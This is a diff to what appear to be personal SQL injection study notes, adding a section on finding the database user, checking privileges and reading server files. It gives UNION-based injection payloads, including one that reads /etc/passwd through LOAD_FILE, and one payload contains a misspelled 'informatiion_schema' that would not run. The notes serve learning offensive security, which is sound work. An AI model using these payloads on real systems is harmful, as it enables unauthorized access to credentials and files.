@@ -352,3 +352,55 @@ Example: Sample injection using all of the information we retrieved above in our
 cn' UNION select 1,username,password,4 from dev.credentials--
 # This will now dump the username and password into columns 2 & 3 for all the users in the credentials table.
 ```
+
+# Reading Files
+
+DB User must have the `FILE` privilege to load a files content into a table and then dump data from that table to read files.
+
+## Finding out which user we are within the database
+We can use any of the following queries:
+```sql
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+```
+
+Example Injection:
+```sql
+cn' UNION SELECT 1, user(),3,4-- 
+```
+
+## Finding user privileges
+Testing for super admin privilegs on our current user
+```sql
+SELECT super_priv FROM mysql.user
+```
+Example Payload:
+```sql
+cn' UNION select 1, super_priv, 3, 4 FROM mysql.user-- 
+```
+Example payload in a db with many users
+```sql
+cn' UNION select 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'-- 
+```
+Dumping other priviliges from the `SCHEMA`
+Example Injection:
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges--
+```
+If we know our user, we can add a `WHERE` to refine our results
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM informatiion_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
+```
+
+## `LOAD_FILE'
+We can load a file using the `LOAD_FILE()` function
+```sql
+SELECT LOAD_FILE('/etc/passwd');
+```
+:warning: We can only read files if the OS user MySQL is running under, has access to it.
+
+We can insert this into one of our colums to read a file:
+```sql
+cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- 
+```
